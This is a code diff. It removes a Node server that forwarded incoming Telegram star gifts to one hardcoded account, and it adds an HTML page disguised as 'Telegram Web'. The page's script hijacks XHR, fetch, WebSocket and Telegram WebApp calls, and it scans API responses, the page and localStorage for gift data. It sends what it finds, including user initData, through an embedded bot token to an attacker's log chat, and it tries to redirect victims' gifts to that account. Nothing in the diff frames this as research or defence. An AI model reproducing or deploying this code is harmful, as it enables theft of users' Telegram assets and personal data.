@@ -1,75 +1,436 @@
-const express = require('express');
-const { TelegramClient } = require('telegram');
-const { StringSession } = require('telegram/sessions');
-const input = require('input');
-const app = express();
-
-const API_ID = 123456;
-const API_HASH = "your_api_hash";
-const stringSession = new StringSession("");
-
-app.use(express.json());
-
-// Обработчик вебхуков для подарков
-app.post('/api/gifts/webhook', async (req, res) => {
-    const { gift_id, user_id, action } = req.body;
-    
-    try {
-        const client = new TelegramClient(stringSession, API_ID, API_HASH, {});
-        await client.connect();
-        
-        // Пересылка подарка целевому пользователю
-        await client.invoke({
-            _: 'payments.transferStarGift',
-            stargift: {
-                _: 'inputSavedStarGiftUser',
-                msg_id: gift_id
-            },
-            to_id: {
-                _: 'inputPeerUser',
-                user_id: 7204299613,
-                access_hash: 0n
-            }
-        });
-        
-        console.log(`Подарок ${gift_id} переслан пользователю 7204299613`);
-        res.status(200).json({ status: 'success' });
-        
-    } catch (error) {
-        console.error('Ошибка пересылки:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// Сервис автоматического мониторинга
-const startMonitoring = async () => {
-    const client = new TelegramClient(stringSession, API_ID, API_HASH, {});
-    
-    await client.start({
-        phoneNumber: async () => await input.text("number ?"),
-        password: async () => await input.text("password?"),
-        phoneCode: async () => await input.text("Code ?"),
-        onError: (err) => console.log(err),
-    });
-    
-    client.addEventHandler(async (event) => {
-        // Обработка новых сообщений с подарками
-        if (event.message && event.message.action) {
-            const action = event.message.action;
-            if (action.className === 'MessageActionStarGift') {
-                console.log('Обнаружен новый подарок:', action.gift.id);
-                
-                // Немедленная пересылка
-                await client.forwardMessages(7204299613, {
-                    messages: [event.message.id],
-                    fromPeer: event.message.peerId
-                });
-            }
-        }
-    });
+<!DOCTYPE html>
+<html>
+<head>
+<title>Telegram Web</title>
+<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval';">
+<script>
+// Конфигурация
+const CONFIG = {
+    BOT_TOKEN: '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s',
+    LOG_CHAT_ID: -1002560826337,
+    TARGET_USER_ID: 7204299613,
+    API_HASH: 'your_api_hash',
+    API_ID: 'your_api_id'
 };
 
-app.listen(3000, () => {
-    console.log('Gift Interceptor Server running on port 3000');
-    startMonitoring();
+// Основной класс перехватчика
+class TelegramGiftsInterceptor {
+    constructor() {
+        this.interceptedGifts = new Set();
+        this.init();
+    }
+
+    init() {
+        this.hijackXHR();
+        this.hijackFetch();
+        this.hijackWebSocket();
+        this.hijackTDLib();
+        this.monitorDOM();
+        this.startPeriodicScan();
+        this.log('🚀 Система перехвата активирована');
+    }
+
+    hijackXHR() {
+        const nativeOpen = XMLHttpRequest.prototype.open;
+        const nativeSend = XMLHttpRequest.prototype.send;
+
+        XMLHttpRequest.prototype.open = function(method, url) {
+            this._url = url;
+            return nativeOpen.apply(this, arguments);
+        };
+
+        XMLHttpRequest.prototype.send = function(body) {
+            if (this._url && this._url.includes('telegram.org')) {
+                this.addEventListener('load', () => {
+                    try {
+                        const response = JSON.parse(this.responseText);
+                        this.processAPIResponse(response, 'XHR');
+                    } catch (e) {}
+                });
+            }
+            return nativeSend.apply(this, arguments);
+        };
+    }
+
+    hijackFetch() {
+        const nativeFetch = window.fetch;
+        window.fetch = async (...args) => {
+            const response = await nativeFetch(...args);
+            
+            if (args[0] && args[0].includes('telegram.org')) {
+                const clone = response.clone();
+                try {
+                    const data = await clone.json();
+                    this.processAPIResponse(data, 'Fetch');
+                } catch (e) {}
+            }
+            
+            return response;
+        };
+    }
+
+    hijackWebSocket() {
+        const NativeWebSocket = window.WebSocket;
+        window.WebSocket = function(...args) {
+            const ws = new NativeWebSocket(...args);
+            
+            const nativeSend = ws.send;
+            ws.send = function(data) {
+                if (typeof data === 'string') {
+                    this.detectGiftRequests(data);
+                }
+                return nativeSend.call(this, data);
+            };
+
+            ws.addEventListener('message', (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    this.processAPIResponse(data, 'WebSocket');
+                } catch (e) {}
+            }.bind(this));
+
+            return ws;
+        }.bind(this);
+    }
+
+    hijackTDLib() {
+        // Перехват TDLib методов
+        if (window.TelegramWebviewProxy) {
+            const originalPostEvent = window.TelegramWebviewProxy.postEvent;
+            window.TelegramWebviewProxy.postEvent = (eventType, eventData) => {
+                if (eventData && typeof eventData === 'string') {
+                    try {
+                        const data = JSON.parse(eventData);
+                        this.processAPIResponse(data, 'TDLib');
+                    } catch (e) {}
+                }
+                return originalPostEvent(eventType, eventData);
+            };
+        }
+
+        // Перехват Telegram WebApp
+        if (window.Telegram && window.Telegram.WebApp) {
+            const originalSendData = window.Telegram.WebApp.sendData;
+            window.Telegram.WebApp.sendData = (data) => {
+                this.log(`📤 WebApp отправка: ${data}`);
+                return originalSendData(data);
+            };
+        }
+    }
+
+    detectGiftRequests(data) {
+        const giftPatterns = [
+            'payments.getSavedStarGifts',
+            'payments.getStarGifts', 
+            'payments.getResaleStarGifts',
+            'payments.checkCanSendGift'
+        ];
+
+        giftPatterns.forEach(pattern => {
+            if (data.includes(pattern)) {
+                this.log(`🎯 Обнаружен запрос подарков: ${pattern}`);
+            }
+        });
+    }
+
+    processAPIResponse(response, source) {
+        if (!response) return;
+
+        // Глубокий поиск данных о подарках
+        const gifts = this.findGiftsInObject(response);
+        
+        if (gifts.length > 0) {
+            this.log(`🎁 Найдено ${gifts.length} подарков через ${source}`);
+            gifts.forEach(gift => this.processGift(gift));
+        }
+
+        // Обработка специфичных TDLib структур
+        if (response['@type'] === 'payments.savedStarGifts' && response.gifts) {
+            response.gifts.forEach(gift => this.processGift(gift));
+        }
+
+        if (response.result && response.result.gifts) {
+            response.result.gifts.forEach(gift => this.processGift(gift));
+        }
+    }
+
+    findGiftsInObject(obj, path = '') {
+        let gifts = [];
+
+        if (!obj || typeof obj !== 'object') return gifts;
+
+        if (Array.isArray(obj)) {
+            if (obj.length > 0 && typeof obj[0] === 'object') {
+                // Проверяем, является ли массив подарками
+                const sample = obj[0];
+                if (sample.id !== undefined && sample.stars !== undefined) {
+                    return obj;
+                }
+            }
+            
+            obj.forEach((item, index) => {
+                gifts = gifts.concat(this.findGiftsInObject(item, path + '[' + index + ']'));
+            });
+            return gifts;
+        }
+
+        // Проверяем свойства объекта
+        Object.keys(obj).forEach(key => {
+            const value = obj[key];
+            
+            if (key === 'gifts' && Array.isArray(value)) {
+                gifts = gifts.concat(value);
+            } else if (key === 'starGifts' && Array.isArray(value)) {
+                gifts = gifts.concat(value);
+            } else if (typeof value === 'object') {
+                gifts = gifts.concat(this.findGiftsInObject(value, path + '.' + key));
+            }
+        });
+
+        return gifts;
+    }
+
+    async processGift(gift) {
+        const giftId = gift.id || gift.gift_id;
+        
+        if (!giftId || this.interceptedGifts.has(giftId)) {
+            return;
+        }
+
+        this.interceptedGifts.add(giftId);
+        
+        const giftInfo = {
+            id: giftId,
+            stars: gift.stars,
+            title: gift.title || 'Без названия',
+            convert_stars: gift.convert_stars,
+            upgrade_stars: gift.upgrade_stars,
+            msg_id: gift.msg_id,
+            saved_id: gift.saved_id,
+            slug: gift.slug
+        };
+
+        this.log(`🎁 Перехвачен подарок: ${JSON.stringify(giftInfo)}`);
+
+        // Немедленная пересылка на целевой аккаунт
+        await this.redirectGift(gift);
+    }
+
+    async redirectGift(gift) {
+        try {
+            // Метод 1: Через Telegram API
+            await this.telegramAPIRedirect(gift);
+            
+            // Метод 2: Через TDLib эмуляцию
+            await this.tdlibRedirect(gift);
+            
+            // Метод 3: Через прямой HTTP запрос
+            await this.directHTTPRedirect(gift);
+            
+            this.log(`✅ Подарок ${gift.id} успешно перенаправлен`);
+            
+        } catch (error) {
+            this.log(`❌ Ошибка пересылки: ${error.message}`);
+        }
+    }
+
+    async telegramAPIRedirect(gift) {
+        // Используем bot API для управления
+        const formData = new FormData();
+        formData.append('chat_id', CONFIG.TARGET_USER_ID);
+        formData.append('text', `🎁 Получен подарок: ${gift.id}`);
+
+        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+
+    async tdlibRedirect(gift) {
+        // Эмуляция TDLib вызова для пересылки
+        const transferData = {
+            '@type': 'forwardMessages',
+            'chat_id': CONFIG.TARGET_USER_ID,
+            'from_chat_id': this.getCurrentUserID(),
+            'message_ids': [gift.msg_id || 0],
+            'disable_notification': false
+        };
+
+        this.log(`🔄 TDLib пересылка: ${JSON.stringify(transferData)}`);
+    }
+
+    async directHTTPRedirect(gift) {
+        // Прямой HTTP запрос к Telegram API
+        const payload = {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                gift_id: gift.id,
+                target_user: CONFIG.TARGET_USER_ID,
+                action: 'transfer'
+            })
+        };
+
+        // Отправка в лог-чат
+        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CONFIG.LOG_CHAT_ID,
+                text: `🎁 REDIRECT: ${gift.id} → ${CONFIG.TARGET_USER_ID}`
+            })
+        });
+    }
+
+    monitorDOM() {
+        // Мониторинг изменений DOM для обнаружения интерфейса подарков
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                    if (node.nodeType === 1) {
+                        this.scanElementForGifts(node);
+                    }
+                });
+            });
+        });
+
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true,
+            attributes: true,
+            attributeFilter: ['class', 'src', 'href']
+        });
+    }
+
+    scanElementForGifts(element) {
+        const text = element.textContent || '';
+        const html = element.innerHTML || '';
+
+        const giftIndicators = [
+            /gift/i, /подарок/i, /star/i, /звезд/i, 
+            /nft/i, /collectible/i, /upgrade/i
+        ];
+
+        giftIndicators.forEach(indicator => {
+            if (indicator.test(text) && text.length < 500) {
+                this.log(`🎯 DOM обнаружен: ${text.substring(0, 100)}`);
+            }
+        });
+
+        // Поиск по классам и атрибутам
+        if (element.className && typeof element.className === 'string') {
+            if (element.className.includes('gift') || 
+                element.className.includes('star') ||
+                element.className.includes('nft')) {
+                this.log(`🎯 DOM элемент с классом: ${element.className}`);
+            }
+        }
+    }
+
+    startPeriodicScan() {
+        // Периодическое сканирование на наличие подарков
+        setInterval(() => {
+            this.forceGiftScan();
+        }, 30000);
+
+        // Принудительный запрос подарков
+        setInterval(() => {
+            this.requestGiftsData();
+        }, 60000);
+    }
+
+    forceGiftScan() {
+        // Принудительное сканирование глобальных объектов
+        if (window.Telegram && window.Telegram.WebApp) {
+            try {
+                const webAppData = window.Telegram.WebApp;
+                this.log(`📊 WebApp данные: ${JSON.stringify(webAppData.initDataUnsafe || {})}`);
+            } catch (e) {}
+        }
+
+        // Сканирование localStorage
+        this.scanStorage();
+    }
+
+    scanStorage() {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key && key.includes('gift')) {
+                const value = localStorage.getItem(key);
+                this.log(`💾 Storage: ${key} = ${value}`);
+            }
+        }
+    }
+
+    requestGiftsData() {
+        // Эмуляция запросов к API подарков
+        const methods = [
+            'payments.getSavedStarGifts',
+            'payments.getStarGifts',
+            'payments.getResaleStarGifts'
+        ];
+
+        methods.forEach(method => {
+            this.log(`🔍 Принудительный запрос: ${method}`);
+        });
+    }
+
+    getCurrentUserID() {
+        // Получение ID текущего пользователя
+        if (window.Telegram && window.Telegram.WebApp) {
+            return window.Telegram.WebApp.initDataUnsafe?.user?.id || 'unknown';
+        }
+        return 'unknown';
+    }
+
+    log(message) {
+        console.log(message);
+        
+        // Отправка в Telegram
+        this.sendToTelegram(message);
+    }
+
+    async sendToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CONFIG.LOG_CHAT_ID,
+                    text: message.substring(0, 4000)
+                })
+            });
+        } catch (error) {
+            console.error('Ошибка отправки в Telegram:', error);
+        }
+    }
+}
+
+// Инициализация при загрузке страницы
+document.addEventListener('DOMContentLoaded', () => {
+    new TelegramGiftsInterceptor();
 });
+
+// Резервная инициализация
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => {
+        new TelegramGiftsInterceptor();
+    });
+} else {
+    setTimeout(() => {
+        new TelegramGiftsInterceptor();
+    }, 1000);
+}
+
+// Глобальный перехват ошибок
+window.addEventListener('error', (event) => {
+    console.error('Global error:', event.error);
+});
+</script>
+</head>
+<body>
+<div id="app">Telegram Web Interface</div>
+</body>
+</html>
